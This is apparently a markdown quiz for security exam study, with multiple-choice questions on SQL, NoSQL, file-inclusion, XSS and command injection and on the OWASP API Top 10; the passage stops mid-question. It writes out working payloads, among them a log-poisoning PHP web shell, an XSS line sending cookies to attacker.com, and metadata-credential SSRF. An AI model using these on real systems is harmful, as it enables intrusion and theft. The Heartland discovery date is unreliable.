# mcq-02-session_01B.md
# MCQ Set — Session 01B : Injection Deep Dive + OWASP API Security

---

## 📑 Index

- [Instructions](#instructions)
- [MCQs — Q01 to Q30](#mcqs)
- [Quick Answer Key](#quick-answer-key)

---

## Instructions

- 30 questions — covers core syllabus + 📌 Extra Notes from Session 01B
- One correct answer per question
- ✅ marks the correct option
- Full explanation follows every question — including **why each wrong option is wrong**
- Questions are deliberately tricky — watch for payload syntax traps,
  version comparison swaps, and one-word rename traps

---

## MCQs

---

### Q01
**A penetration tester submits `' ORDER BY 3--` to a query parameter
and receives a database error, but `' ORDER BY 2--` returns a normal
response. What does this confirm, and what is the immediate next step?**

- A) The query has 3 columns; next step is to extract the DB version
- B) The query has 2 columns; next step is Boolean-based blind extraction
- C) ✅ The query has 2 columns; next step is to identify which column
  position is reflected in the HTTP response
- D) The query has 3 columns; next step is to inject a UNION SELECT
  with 3 NULL values

**Explanation:**
- ✅ **C is correct.** `ORDER BY 3` fails → `ORDER BY 2` succeeds →
  the original query returns exactly **2 columns**. In Union-Based SQLi,
  once the column count is confirmed the next step is to find which
  column position is **displayed in the response** — by injecting a
  distinguishable value like `'a'` in each position:
  `' UNION SELECT 'a',NULL--` then `' UNION SELECT NULL,'a'--`.
- ❌ **A** — The column count is 2, not 3. ORDER BY 3 errored because
  column 3 does not exist.
- ❌ **B** — Boolean-based blind is used when no data is visible in
  the response. Since Union-Based is being set up (ORDER BY
  enumeration), the response is visible — no need to switch to blind.
- ❌ **D** — The column count is 2, not 3. A UNION SELECT with 3 NULLs
  would error because it mismatches the original query's column count.

---

### Q02
**Which SQL injection type is being used in the following payload, and
what is its defining characteristic?**

```sql
1; IF(ASCII(SUBSTRING((SELECT database()),1,1))=109, SLEEP(5), 0)--
```

- A) Boolean-Based Blind SQLi — infers data from response content
  differences
- B) Error-Based SQLi — triggers a database error containing the
  database name
- C) Out-of-Band SQLi — exfiltrates the database name via DNS lookup
- D) ✅ Time-Based Blind SQLi — infers data from server response
  delay when the condition is true

**Explanation:**
- ✅ **D is correct.** The payload uses `SLEEP(5)` inside an `IF()`
  conditional — the server delays 5 seconds only if the ASCII value
  of the first character of `database()` equals 109 (= 'm'). No data
  appears in the HTTP response — the only signal is **response
  timing**. This is the defining characteristic of Time-Based Blind
  SQLi.
- ❌ **A** — Boolean-Based Blind uses no sleep/delay. It infers
  true/false from **page content or behavior differences** (page
  loads vs page changes) — no timing element.
- ❌ **B** — Error-Based deliberately triggers a database error whose
  message contains extracted data. No error is being triggered here —
  `SLEEP()` is not an error-producing function.
- ❌ **C** — OOB SQLi uses DNS lookups or HTTP requests to an
  attacker-controlled server. There is no DNS/HTTP callback in this
  payload — only an in-process sleep.

---

### Q03
**What is the key technical requirement that makes Union-Based SQLi
work, and which database engine requires `FROM DUAL` in every
`SELECT` statement within a UNION injection?**

- A) Columns must be of identical data type; PostgreSQL requires
  `FROM DUAL`
- B) ✅ The UNION query must match the original query's column count
  and compatible data types; Oracle requires `FROM DUAL`
- C) The UNION query must return fewer columns than the original;
  MySQL requires `FROM DUAL`
- D) The injection point must be in a WHERE clause; MSSQL requires
  `FROM DUAL`

**Explanation:**
- ✅ **B is correct.** Union-Based SQLi requires: (1) the injected
  `UNION SELECT` must have the **same number of columns** as the
  original query, and (2) column data types must be **compatible**
  (not necessarily identical — NULL is compatible with any type).
  **Oracle** specifically requires a `FROM` clause in every SELECT
  statement — `FROM DUAL` is used when no real table is needed.
  Forgetting `FROM DUAL` causes Oracle Union injections to fail.
- ❌ **A** — Data types need to be compatible, not strictly identical
  (NULL satisfies any column type). PostgreSQL does not require
  `FROM DUAL` — Oracle does.
- ❌ **C** — The UNION must match (not have fewer) columns. MySQL
  does not require `FROM DUAL`.
- ❌ **D** — Injection can occur in various clause positions, not
  just WHERE. MSSQL does not require `FROM DUAL`.

---

### Q04
**A developer stores a malicious username `admin'--` through a
registration form that correctly escapes the input. Later, the
password-change function retrieves the stored username and
builds a query by string concatenation. The query becomes:
`UPDATE users SET password='new' WHERE username='admin'--'`
— effectively changing the admin's password. What SQLi type is this?**

- A) Union-Based SQLi — uses UNION to merge result sets
- B) Boolean-Based Blind SQLi — infers data from response differences
- C) Time-Based Blind SQLi — uses SLEEP to infer data
- D) ✅ Second-Order SQLi — payload stored safely, fires when
  retrieved and reused in a new unsanitized query

**Explanation:**
- ✅ **D is correct.** Second-Order (Stored) SQLi is the exact attack
  described: the malicious payload (`admin'--`) is **stored safely**
  (input was correctly escaped at entry), but when it is later
  **retrieved from the database and re-used in a new SQL statement
  via string concatenation**, it fires. The application trusted data
  from its own database as safe — a false assumption.
- ❌ **A** — Union-Based uses UNION to append a second SELECT. No
  UNION is involved here.
- ❌ **B** — Boolean-Based Blind infers data from page behavior.
  The attack here directly modifies the admin password — no
  inference loop.
- ❌ **C** — Time-Based Blind uses SLEEP/WAITFOR. No timing element
  is present in this attack.

> [!NOTE]
> Second-Order SQLi is often missed by automated scanners because the
> payload and its execution are in two separate requests/operations.
> SAST and manual code review are more reliable detection methods.

---

### Q05
**In Microsoft SQL Server, which built-in stored procedure can be
abused via SQL Injection to escalate to OS-level command execution,
and what privilege is required to re-enable it?**

- A) `sp_executesql` — requires `db_owner` role
- B) `sp_oacreate` — requires `public` role
- C) `xp_dirtree` — requires `bulkadmin` role
- D) ✅ `xp_cmdshell` — requires `sysadmin` role (disabled by default)

**Explanation:**
- ✅ **D is correct.** `xp_cmdshell` executes OS shell commands
  directly from MSSQL. It is **disabled by default** in modern SQL
  Server versions. To re-enable it, the database account must have
  **`sysadmin` privileges** — meaning an attacker must first
  escalate to `sysadmin` within the database before re-enabling
  it and achieving OS command execution.
- ❌ **A** — `sp_executesql` executes dynamic SQL within the database
  — it does not provide OS command execution. It's actually a safer
  alternative for dynamic queries (supports parameterization).
- ❌ **B** — `sp_oacreate` creates COM automation objects and can be
  used for RCE, but it requires `sysadmin` not `public`, and
  `xp_cmdshell` is the canonical answer for OS command execution
  via SQLi.
- ❌ **C** — `xp_dirtree` lists directories and is primarily used
  for OOB data exfiltration via UNC paths (SMB) — not direct OS
  command execution. It does not require re-enabling the way
  `xp_cmdshell` does.

---

### Q06
**A web application is vulnerable to Local File Inclusion (LFI).
The include function appends `.php` to user input:
`include($_GET['page'] . '.php')`. The server runs PHP 5.2.
Which payload successfully reads `/etc/passwd`?**

- A) `../../../../etc/passwd`
- B) `....//....//....//etc/passwd`
- C) `%2e%2e%2f%2e%2e%2fetc%2fpasswd`
- D) ✅ `../../../../etc/passwd%00`

**Explanation:**
- ✅ **D is correct.** PHP versions **below 5.3.4** are vulnerable to
  **null byte injection** (`%00`). The null byte terminates the
  string before PHP appends `.php` — so the actual path becomes
  `/etc/passwd` (the `.php` is ignored). This is a classic bypass
  for the `.php` extension appending pattern.
- ❌ **A** — Without the null byte, the include would attempt to
  load `/etc/passwd.php`, which doesn't exist — the LFI would fail
  to return the file.
- ❌ **B** — The `....//` bypass works against filters that strip
  `../` — but the issue here is the appended `.php` extension, not
  a traversal filter. This payload still ends up requesting
  `/etc/passwd.php`.
- ❌ **C** — URL encoding of `../../etc/passwd` still results in
  `/etc/passwd.php` after extension appending — same problem. Also,
  most servers decode `%2e%2e%2f` back to `../` before passing to
  PHP.

---

### Q07
**What PHP configuration directive must be set to `On` for Remote
File Inclusion (RFI) to be exploitable, and what is its default
value in PHP versions 5.2 and later?**

- A) `allow_url_fopen = On` — enabled by default
- B) `open_basedir = Off` — disabled by default (Off means unrestricted)
- C) `display_errors = On` — enabled by default in development
- D) ✅ `allow_url_include = On` — disabled (Off) by default since
  PHP 5.2

**Explanation:**
- ✅ **D is correct.** `allow_url_include` controls whether PHP can
  include files from remote URLs in `include()`, `require()`,
  `include_once()`, and `require_once()`. It has been **Off by
  default since PHP 5.2** — making RFI significantly less common
  in modern applications. When On, an attacker can supply a remote
  URL as the include path and have the server fetch and execute
  their PHP code.
- ❌ **A** — `allow_url_fopen` controls whether PHP can open URLs
  with file functions like `fopen()` and `file_get_contents()`. It
  is On by default but is NOT sufficient alone for RFI — `include()`
  with a remote URL requires `allow_url_include`. Confusion between
  these two directives is a common MCQ trap.
- ❌ **B** — `open_basedir` restricts which directories PHP can
  access — setting it tightly is a **defense** against LFI/RFI.
  It's not the prerequisite for RFI.
- ❌ **C** — `display_errors` controls error message visibility —
  relevant to Error-Based SQLi and information disclosure, not to
  file inclusion.

---

### Q08
**An attacker sends the following HTTP request to a web server running
PHP with Apache:**

```http
GET /index.php?page=../../../../var/log/apache2/access.log HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```

**Followed by:**

```
GET /index.php?page=../../../../var/log/apache2/access.log&cmd=id
```

**What attack technique is being executed?**

- A) Remote File Inclusion — the attacker is including a remote PHP
  file
- B) Stored XSS — injecting a script into server logs for execution
- C) Time-Based Blind SQLi — using the access log as a timing oracle
- D) ✅ LFI + Log Poisoning — injecting PHP into the access log via
  User-Agent, then including the log via LFI to achieve RCE

**Explanation:**
- ✅ **D is correct.** This is the classic **LFI → RCE via Log
  Poisoning** escalation chain:
  - Step 1: The attacker injects PHP code into the Apache access log
    by sending a request with a malicious `User-Agent` header.
    Apache logs the User-Agent verbatim.
  - Step 2: The attacker uses LFI to include the access log file.
    Apache serves the log file → PHP interprets the embedded
    `<?php system($_GET['cmd']); ?>` → executes OS command `id`.
  - This escalates read-only LFI to full Remote Code Execution.
- ❌ **A** — RFI would use a remote URL (http://attacker.com/shell)
  as the `page` parameter — not a local log file path.
- ❌ **B** — Stored XSS injects client-side JavaScript for browser
  execution. Log poisoning injects server-side PHP for server
  execution — entirely different interpreters and contexts.
- ❌ **C** — No SQL database or SLEEP/timing mechanism is involved.

---

### Q09
**Which type of XSS is characterized by the server never receiving
the malicious payload, a WAF being completely blind to the attack,
and the vulnerability existing entirely in client-side JavaScript
code?**

- A) Reflected XSS
- B) Stored XSS
- C) Blind Stored XSS
- D) ✅ DOM-Based XSS

**Explanation:**
- ✅ **D is correct.** DOM-Based XSS operates entirely in the
  browser. The payload travels via a source that is never sent to
  the server (e.g., URL hash fragment `#<script>...`), is read by
  client-side JavaScript, and written to a dangerous sink
  (`innerHTML`, `eval`, `document.write`). The server never sees
  the payload — HTTP traffic inspection and WAFs are completely
  blind to it. Detection requires JavaScript source code review.
- ❌ **A** — Reflected XSS payload IS in the HTTP request and IS
  reflected in the HTTP response — both are visible to WAFs and
  server-side filters.
- ❌ **B** — Stored XSS payload is submitted via HTTP (WAF sees it
  on submission) and served via HTTP (WAF sees it on retrieval).
- ❌ **C** — Blind Stored XSS is a variant of Stored XSS — the
  payload IS stored on the server and IS served via HTTP. The
  "blind" refers to the attacker not immediately seeing it fire
  (it fires in the admin panel). It is not DOM-based.

---

### Q10
**An attacker wants to steal session cookies via XSS. The cookies
are set with the `HttpOnly` flag. Which statement is correct?**

- A) ✅ `HttpOnly` prevents JavaScript from accessing the cookie via
  `document.cookie` — the cookie theft XSS payload will fail to
  read the session cookie
- B) `HttpOnly` prevents the cookie from being sent over HTTP —
  it only transmits over HTTPS
- C) `HttpOnly` encrypts the cookie value — the attacker receives
  an encrypted token they cannot use
- D) `HttpOnly` is a CSP directive — it blocks inline script
  execution that would read cookies

**Explanation:**
- ✅ **A is correct.** The `HttpOnly` cookie attribute instructs the
  browser to **deny JavaScript access** to the cookie via
  `document.cookie`. A cookie theft payload like
  `document.location='http://attacker.com/?c='+document.cookie` will
  return an empty string or exclude the `HttpOnly` cookie — the
  attacker cannot steal it via XSS. The cookie is still sent
  normally in HTTP requests (just not readable by JS).
- ❌ **B** — This describes the **`Secure`** flag, not `HttpOnly`.
  `Secure` ensures the cookie is only sent over HTTPS connections.
- ❌ **C** — `HttpOnly` does not encrypt the cookie value. The value
  is still plaintext — it's just inaccessible to JavaScript.
- ❌ **D** — `HttpOnly` is a **cookie attribute** (`Set-Cookie:
  session=x; HttpOnly`), not a CSP directive. CSP controls resource
  loading policies. They are separate mechanisms.

---

### Q11
**Identify the XSS injection context and the correct payload for the
following vulnerable HTML:**

```html
<input type="text" value="USER_INPUT">
```

**The developer filters `<script>` tags. Which payload successfully
exploits XSS?**

- A) `<script>alert(1)</script>` — standard script injection
- B) `javascript:alert(1)` — javascript URI scheme
- C) `{{7*7}}` — template injection to evaluate expressions
- D) ✅ `" onmouseover="alert(1)` — breaks out of value attribute,
  injects event handler

**Explanation:**
- ✅ **D is correct.** The injection is in an **HTML attribute
  value context** — inside `value="..."`. To inject executable code
  you must break out of the attribute with `"` and then inject an
  event handler that doesn't use `<script>` tags:
  `" onmouseover="alert(1)` renders as
  `<input type="text" value="" onmouseover="alert(1)">`.
  When the user hovers over the input, `alert(1)` fires — without
  any `<script>` tags.
- ❌ **A** — `<script>` tags are filtered by the developer, making
  this the obvious bypass target. Even without filtering, inserting
  `<script>` inside a `value` attribute would need to close the
  attribute first.
- ❌ **B** — `javascript:` URI scheme works in `href` or `src`
  attributes, not in a `value` attribute of a text input.
- ❌ **C** — `{{7*7}}` is a Server-Side Template Injection (SSTI)
  payload for template engines (Jinja2, Twig). It has no effect in
  an HTML `value` attribute context processed by the browser.

---

### Q12
**In a MongoDB-backed login form, an attacker sends the following
JSON body:**

```json
{"username": "admin", "password": {"$ne": ""}}
```

**What type of attack is this, what operator is being abused, and
what is the result?**

- A) SQL Injection — UNION operator — returns all database records
- B) ✅ NoSQL Injection — MongoDB `$ne` (not equal) operator —
  authentication bypass because password ≠ "" is always true for any
  non-empty password
- C) Mass Assignment — injecting extra fields into the user object —
  grants admin privileges
- D) SSTI — injecting a template expression — executes server-side
  code

**Explanation:**
- ✅ **B is correct.** This is a **MongoDB operator injection** using
  the `$ne` (not equal) operator. The query becomes:
  `db.users.find({username: "admin", password: {$ne: ""}})` —
  meaning "find a user named admin whose password is not equal to
  an empty string." Since any real password satisfies this
  condition, the query returns the admin record without the attacker
  knowing the actual password — authentication is bypassed.
- ❌ **A** — `$ne` is a MongoDB query operator, not SQL. No SQL
  UNION is involved — the database is NoSQL (MongoDB).
- ❌ **C** — Mass Assignment involves adding extra properties to an
  object model (e.g., `"admin": true`). The `$ne` operator is not
  adding a property to the user object — it's manipulating the
  query condition.
- ❌ **D** — SSTI uses template engine syntax like `{{7*7}}` or
  `${7*7}`. MongoDB operator injection using `$ne` is not template
  injection.

---

### Q13
**A developer wants to prevent MongoDB operator injection. Which
approach is the most effective defense?**

- A) Use `$where` with JavaScript expressions to validate all inputs
- B) Allowlist only alphanumeric characters for all inputs
- C) ✅ Use an ODM (like Mongoose) with strict schema typing — reject
  objects where strings are expected, and disable `$where`
- D) Store all passwords in plaintext to avoid hashing comparison
  bypass

**Explanation:**
- ✅ **C is correct.** An **ODM (Object Document Mapper)** like
  Mongoose enforces schema types — if the schema defines `password`
  as `String`, Mongoose will reject the `{"$ne": ""}` object input
  because it's not a string. Additionally, **disabling `$where`**
  removes the JavaScript execution operator — the most dangerous
  MongoDB injection vector (enables time-based blind NoSQLi and
  JS expression injection).
- ❌ **A** — `$where` is exactly what should be **disabled** — it
  accepts JavaScript expressions and is the most dangerous MongoDB
  operator for injection. Using it for validation would massively
  increase attack surface.
- ❌ **B** — Allowlisting alphanumeric characters helps for simple
  fields but breaks legitimate use cases (emails with `@`, names
  with spaces, passwords with special chars). ODM type enforcement
  is more precise and robust.
- ❌ **D** — Storing passwords in plaintext is a catastrophic
  security failure (A04:2025 Cryptographic Failures) — this would
  never be a correct defense for any attack.

---

### Q14
**An attacker executes the following on a vulnerable web application:**

```
GET /ping?host=8.8.8.8;%20cat%20/etc/passwd
```

**The application runs a ping command using the user-supplied `host`
parameter. What attack is this, what shell metacharacter is used,
and how does the OS interpret the injected sequence?**

- A) SQLi — semicolon is a SQL statement separator — executes a
  second SQL query
- B) Path Traversal — `%20` is a space — navigates to `/etc/passwd`
- C) ✅ Command Injection — semicolon (`;`) is a shell command
  separator — OS executes `ping 8.8.8.8` then `cat /etc/passwd`
- D) LFI — the path `/etc/passwd` is passed to an include function

**Explanation:**
- ✅ **C is correct.** `%20` URL-decodes to a space. The decoded
  input becomes `8.8.8.8; cat /etc/passwd`. The application
  executes: `ping -c 1 8.8.8.8; cat /etc/passwd`. The shell
  interprets `;` as a command separator — executes both commands
  unconditionally. The output of `cat /etc/passwd` is returned
  (or executed blindly). This is **OS Command Injection** —
  A05:2025 Injection.
- ❌ **A** — SQL uses `;` to separate statements, but this is an
  OS-level ping command, not a SQL query. The interpreter here is
  the OS shell, not a database.
- ❌ **B** — `%20` is a URL-encoded space — it is not a path
  traversal sequence. Path traversal uses `../` sequences. The
  `/etc/passwd` here is an argument to `cat`, not an include path.
- ❌ **D** — LFI requires a PHP `include()` or similar function
  call. There's no file inclusion call here — the `host` parameter
  is passed to a `ping` OS command.

---

### Q15
**Which OWASP API Security Top 10 2023 category was created by
merging two separate 2019 categories, and what were those two
categories?**

- A) ✅ API3:2023 Broken Object Property Level Authorization (BOPLA)
  — merged from API3:2019 (Excessive Data Exposure) and API6:2019
  (Mass Assignment)
- B) API4:2023 Unrestricted Resource Consumption — merged from
  API4:2019 (Lack of Resources) and API8:2019 (Injection)
- C) API2:2023 Broken Authentication — merged from API2:2019
  (Broken Authentication) and API10:2019 (Insufficient Logging)
- D) API9:2023 Improper Inventory Management — merged from API7:2019
  (Security Misconfiguration) and API9:2019 (Improper Assets
  Management)

**Explanation:**
- ✅ **A is correct.** API3:2023 **Broken Object Property Level
  Authorization (BOPLA)** was formed by merging:
  - **API3:2019 Excessive Data Exposure** — API returns too many
    fields; client expected to filter sensitive ones
  - **API6:2019 Mass Assignment** — API auto-binds request body
    properties to model, allowing attacker to set privileged fields
  Both share the same root cause: **unauthorized access to object
  properties** — reading too many (exposure) or writing unauthorized
  ones (mass assignment). Merging them under BOPLA reflects this
  common root cause.
- ❌ **B** — API4:2023 is a rename only (not a merge) of API4:2019.
  Injection (API8:2019) was **removed** from the API Security list
  in 2023 — not merged into API4.
- ❌ **C** — API2:2023 Broken Authentication has the same name as
  API2:2019 — it was not formed by any merge.
- ❌ **D** — API9:2023 is a simple rename of API9:2019 (Assets →
  Inventory). No merge involved. Security Misconfiguration moved
  from API7:2019 to API8:2023 — a position change, not a merge.

---

### Q16
**Which two categories were REMOVED from the OWASP API Security Top
10 when the 2019 list was updated to 2023?**

- A) API1:2019 BOLA and API5:2019 BFLA
- B) API3:2019 Excessive Data Exposure and API6:2019 Mass Assignment
- C) API4:2019 Lack of Resources and API7:2019 Security
  Misconfiguration
- D) ✅ API8:2019 Injection and API10:2019 Insufficient Logging
  & Monitoring

**Explanation:**
- ✅ **D is correct.** Two risks were removed from the API Security
  list in the 2023 update:
  - **API8:2019 Injection** — removed because injection risks are
    already comprehensively covered by the OWASP Web Application
    Top 10 (A05:2025). Including it in the API-specific list was
    redundant.
  - **API10:2019 Insufficient Logging & Monitoring** — removed and
    its slot taken by the new **API10:2023 Unsafe Consumption of
    APIs**, which addresses the growing risk of trusting third-party
    API responses without validation.
- ❌ **A** — BOLA (API1) and BFLA (API5) remain in 2023 at the
  same positions — unchanged.
- ❌ **B** — These two were not removed — they were **merged** into
  API3:2023 BOPLA.
- ❌ **C** — API4 was renamed (not removed); API7:2019 Security
  Misconfiguration was moved to API8:2023 (not removed).

---

### Q17
**An attacker registers a webhook on a third-party service using the
URL `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
as the webhook target. When the third-party service triggers the
webhook, the application fetches the URL and processes the response.
Which OWASP API Security 2023 category does this attack fall under?**

- A) API2:2023 Broken Authentication
- B) API4:2023 Unrestricted Resource Consumption
- C) API9:2023 Improper Inventory Management
- D) ✅ API7:2023 Server Side Request Forgery (SSRF)

**Explanation:**
- ✅ **D is correct.** This is a classic **API-layer SSRF attack**.
  The attacker abuses a webhook registration or URL-fetch feature to
  coerce the server into making an HTTP request to the AWS EC2
  metadata endpoint (`169.254.169.254`) — an internal address only
  accessible from within the cloud instance. The server returns the
  IAM security credentials to the attacker. This maps to
  **API7:2023 SSRF** in the API Security Top 10.
- ❌ **A** — Broken Authentication (API2) relates to token/credential
  weaknesses in the API's own authentication layer — not to
  server-side request manipulation.
- ❌ **B** — Unrestricted Resource Consumption (API4) relates to
  rate limiting and resource exhaustion — not to SSRF via webhook.
- ❌ **C** — Improper Inventory Management (API9) relates to
  undocumented/deprecated API endpoints — not webhook abuse.

> [!NOTE]
> SSRF appears in **three OWASP contexts** — know all three positions:
> **A10:2021** (Web App, standalone) → **absorbed into A01:2025**
> (Web App, Broken Access Control) → **API7:2023** (API Security,
> standalone). Exam questions may test any of these three placements.

---

### Q18
**A ticket-selling platform offers a fair-purchase API
(`POST /api/v1/checkout`). During a product launch, automated bots
send thousands of checkout requests per second, buying all inventory
before any human can complete a purchase. There is no technical
vulnerability in the API code. Which OWASP API Security 2023
category does this represent?**

- A) API4:2023 Unrestricted Resource Consumption — the bots are
  consuming API resources at scale
- B) API2:2023 Broken Authentication — the bots are not
  authenticated
- C) API5:2023 Broken Function Level Authorization — bots are
  calling functions they are not authorized to call
- D) ✅ API6:2023 Unrestricted Access to Sensitive Business Flows —
  a legitimate business flow is being abused at machine speed with
  no technical flaw

**Explanation:**
- ✅ **D is correct.** API6:2023 **Unrestricted Access to Sensitive
  Business Flows** is specifically defined as abuse of a
  **technically correct API** through **automation and scale** to
  gain unfair advantage. The checkout function works exactly as
  designed — there is no code bug or authorization failure. The
  problem is the lack of bot protection, rate limits, or human
  verification on a flow that can be abused at machine speed
  (ticket scalping, inventory sniping). This is the defining
  scenario for API6:2023.
- ❌ **A** — API4 (Unrestricted Resource Consumption) targets
  **server resource exhaustion** — CPU, memory, bandwidth, cost.
  Scalping bots are abusing **business logic**, not overloading the
  server's compute resources. A subtle but important distinction.
- ❌ **B** — The bots may actually be authenticated (registered
  accounts) — API6 applies even to authenticated automated abuse.
  Broken Authentication (API2) relates to token/credential flaws,
  not bot automation.
- ❌ **C** — BFLA (API5) is about calling **privileged functions
  without authorization** (e.g., regular user calling admin delete
  endpoint). The checkout API is a function regular users ARE
  authorized to call — the problem is automation, not privilege.

---

### Q19
**What is the fundamental conceptual difference between BOLA
(API1:2023) and BFLA (API5:2023)?**

- A) BOLA is for REST APIs; BFLA is for GraphQL APIs
- B) BOLA involves server-side validation; BFLA involves client-side
  validation
- C) ✅ BOLA is a horizontal access control failure at the data
  object level; BFLA is a vertical access control failure at the
  function/endpoint level
- D) BOLA requires authentication; BFLA works only on unauthenticated
  endpoints

**Explanation:**
- ✅ **C is correct.** The core distinction:
  - **BOLA (API1:2023):** A user accesses **another user's data**
    by manipulating an object ID (e.g., changing `/api/users/123`
    to `/api/users/124`). This is **horizontal privilege escalation**
    — same privilege level, different user's resources.
  - **BFLA (API5:2023):** A regular user calls an **admin-level
    function** (e.g., `DELETE /api/admin/users/123`) that they
    should not have access to. This is **vertical privilege
    escalation** — accessing a higher privilege level.
- ❌ **A** — Both BOLA and BFLA apply to REST and GraphQL APIs
  equally. API technology is not the distinguishing factor.
- ❌ **B** — Neither is defined by where validation occurs.
  Both are server-side authorization failures — they occur because
  the **server** fails to check authorization.
- ❌ **D** — BOLA typically occurs on **authenticated** endpoints
  (the attacker is logged in, just accessing another user's data).
  BFLA can occur on authenticated endpoints too (logged-in user
  calling admin function). Authentication status is not the
  distinguishing factor.

---

### Q20
**For which of the following scenarios is the OWASP API Security
2023 category API10:2023 (Unsafe Consumption of APIs) the correct
classification?**

- A) An API endpoint returns all user records without pagination
- B) A user submits `{"$ne":""}` as a password to bypass
  authentication
- C) A developer deploys a v2 API but leaves v1 active and
  unmonitored
- D) ✅ An application calls a third-party geocoding API and
  processes its response without input validation — a compromised
  third-party API returns malicious data that causes SQLi in the
  application's database

**Explanation:**
- ✅ **D is correct.** API10:2023 Unsafe Consumption of APIs covers
  scenarios where an application **trusts third-party API responses
  as inherently safe** — processing them without validation. If the
  third-party API is compromised (supply chain attack), or returns
  malicious data (manipulated response), the consuming application
  processes it unsafely → SQLi, XSS, SSRF, or other injections via
  the API response. This is the defining scenario for API10:2023.
- ❌ **A** — No pagination → excessive data return or resource
  consumption → **API4:2023 Unrestricted Resource Consumption** or
  **API3:2023 BOPLA** (excessive data exposure component).
- ❌ **B** — `$ne` operator injection to bypass authentication →
  **NoSQL Injection** → **A05:2025 Injection** (Web App Top 10) or
  could tie to **API2:2023 Broken Authentication** at API level.
- ❌ **C** — Active deprecated/forgotten API version →
  **API9:2023 Improper Inventory Management**.

---

### Q21
**What was removed from position API6:2019 (Mass Assignment) when
the API Security list was updated to 2023, and where did Mass
Assignment concepts go?**

- A) Mass Assignment was completely eliminated — it's no longer
  considered an API risk
- B) Mass Assignment was moved to API8:2023 under Security
  Misconfiguration
- C) Mass Assignment was renamed to Unrestricted Access to Sensitive
  Business Flows at API6:2023
- D) ✅ Mass Assignment was merged into API3:2023 Broken Object
  Property Level Authorization (BOPLA), alongside Excessive Data
  Exposure (API3:2019)

**Explanation:**
- ✅ **D is correct.** API6:2019 Mass Assignment was merged with
  API3:2019 Excessive Data Exposure to form **API3:2023 BOPLA
  (Broken Object Property Level Authorization)**. The rationale:
  both risks involve **unauthorized access to object properties**
  — one via reading too many properties (excessive exposure), one
  via writing unauthorized properties (mass assignment). The
  combined category addresses **property-level authorization** as
  a unified concept.
- ❌ **A** — Mass Assignment is definitely still an API risk — it's
  just been reorganized under BOPLA rather than given its own slot.
- ❌ **B** — Security Misconfiguration was already at API7:2019 and
  moved to API8:2023. Mass Assignment was not placed there.
- ❌ **C** — API6:2023 is an entirely new category (Unrestricted
  Access to Sensitive Business Flows). Mass Assignment was not
  renamed to it — this is a trap combining two different "what
  happened to API6" facts.

---

### Q22
**A security researcher queries a GraphQL API endpoint with:**

```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

**What attack technique is this, what information is exposed, and
what is the recommended defense?**

- A) BOLA — retrieves another user's schema object — disable
  object-level authorization
- B) Stored XSS — injects schema data into the GraphQL response
  field — encode output
- C) ✅ GraphQL Introspection abuse — exposes the entire API schema
  (types, fields, queries, mutations) — disable introspection in
  production
- D) SSRF — coerces the GraphQL server to fetch the schema from an
  internal endpoint — restrict outbound connections

**Explanation:**
- ✅ **C is correct.** The `__schema` keyword is a **GraphQL
  introspection query** — it returns the complete API schema: all
  types, fields, queries, mutations, and their argument definitions.
  This is the first step in any GraphQL attack — the equivalent of
  discovering all REST endpoints at once. In production, **introspection
  should be disabled** to deny attackers this reconnaissance
  capability. Tools like GraphQL Voyager and InQL use introspection
  to map the full API attack surface.
- ❌ **A** — BOLA involves accessing another user's data by
  manipulating an object ID. `__schema` does not access user data
  — it queries the API schema definition itself.
- ❌ **B** — Stored XSS involves injecting client-side script into
  stored data. This is a schema discovery query — no injection into
  stored data.
- ❌ **D** — SSRF involves the server making outbound requests.
  Introspection is an API query to the GraphQL server itself —
  no outbound request to another server.

---

### Q23
**What makes GraphQL uniquely vulnerable to a Denial of Service
attack through deeply nested queries, and what is the appropriate
defense?**

- A) GraphQL uses HTTP/2 which allows request multiplexing —
  disable HTTP/2 for GraphQL endpoints
- B) GraphQL responses are always uncompressed — enable GZIP to
  reduce payload size
- C) ✅ GraphQL resolvers process nested queries recursively —
  a deeply nested query (e.g., `user{friends{friends{friends{...}}}`)
  causes exponential database calls — defend with query depth
  limits and query complexity limits
- D) GraphQL uses WebSockets by default — switch to REST to avoid
  persistent connection exhaustion

**Explanation:**
- ✅ **C is correct.** GraphQL allows clients to specify exactly
  what data they need — including **nested relationships**. A query
  like `{user{friends{friends{friends{name}}}}}` causes the server's
  resolvers to make exponentially growing database calls at each
  nesting level. With no depth limit, an attacker can trigger
  millions of database queries with a single small HTTP request.
  The correct defenses are:
  - **Query depth limits** — reject queries nested beyond N levels
  - **Query complexity limits** — assign cost points to fields and
    reject queries exceeding a total cost threshold
  - **Timeout enforcement** — abort queries exceeding execution time
- ❌ **A** — HTTP/2 multiplexing is unrelated to GraphQL's nested
  query DoS. The vulnerability is in resolver logic, not HTTP version.
- ❌ **B** — Response compression is irrelevant to query processing
  cost. The server exhausts resources **computing** the deeply
  nested result, not transmitting it.
- ❌ **D** — GraphQL typically uses HTTP POST, not WebSockets
  (though subscriptions can use WebSockets). The nested query DoS
  exists regardless of transport protocol.

---

### Q24
**The Heartland Payment Systems breach is a landmark case in
cybersecurity. Place the following events in the correct
chronological order:**

1. Malware planted on internal payment processing systems
2. SQL Injection via vulnerable public-facing web application
3. RAM scraping captures payment card track data in transit
4. Discovery — breach identified in January 2008

- A) 3 → 2 → 1 → 4
- B) 1 → 3 → 2 → 4
- C) 2 → 3 → 1 → 4
- D) ✅ 2 → 1 → 3 → 4

**Explanation:**
- ✅ **D is correct.** The Heartland attack chain:
  1. **SQLi (initial access)** — attackers exploited SQL injection
     on a public-facing web form to gain foothold in the web tier
  2. **Malware planted** — using the SQLi access (leveraging
     OS command execution via excessive DB privileges), attackers
     installed RAM-scraping malware on internal payment processing
     systems
  3. **RAM scraping** — the malware captured payment card track
     data as transactions were processed in memory — in plaintext
     before encryption
  4. **Discovery** — the breach was discovered in January 2008
     (the attack occurred throughout 2007)
- ❌ **A, B, C** — All place the steps out of correct sequence.
  SQLi is always the initial access vector. RAM scraping is the
  final data collection phase — it requires the malware to already
  be installed (step before it).

---

### Q25
**In the context of OWASP API Security 2023, API9:2023 Improper
Inventory Management has what primary attack scenario, and what
is the correct name of its predecessor in the 2019 list?**

- A) Attacker exploits rate limiting gaps in the API gateway —
  was called "Lack of Resources & Rate Limiting" in 2019
- B) Attacker injects malicious properties via mass assignment —
  was called "Mass Assignment" in 2019
- C) ✅ Attacker accesses deprecated/unmonitored API versions
  (e.g., v1 left running after v2 deployed) or shadow APIs — was
  called "Improper Assets Management" in 2019
